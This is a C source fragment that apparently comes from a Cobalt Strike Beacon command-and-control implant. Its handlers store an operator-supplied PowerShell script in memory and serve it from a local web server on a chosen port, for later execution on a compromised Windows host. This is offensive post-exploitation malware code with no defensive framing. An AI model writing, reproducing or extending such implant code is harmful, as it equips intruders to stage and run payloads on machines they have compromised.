#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "channel.h"
#include "functions.h"
#include "jobs.h"
#include "parse.h"

void serveit(unsigned short port, char * data, int length);

/* track our imported script data */
char * imported = NULL;               /* TODO last imported script not cleaned up on exit, mask candidate.  Is cleaned up for each new import. */

/* import a script that we'll use for awhile */
void command_psh_import(char * buffer, int length) {
	/* free the data if we're not using it */
	if (imported != NULL) {
		free(imported);
	}

	/* alloc some memory and copy our data over */
	imported = (char *)malloc(length + 1);
	memcpy(imported, buffer, length);
	imported[length] = '\0';

	/* that's it... now we'll need to serve this in a local web server */
}

void command_psh_host_tcp(char * buffer, int length) {
	datap parser;
	WORD  port;

	if (imported == NULL)
		return;

	data_init(&parser, buffer, length);
	port = data_short(&parser);

	serveit(port, imported, strlen(imported));
}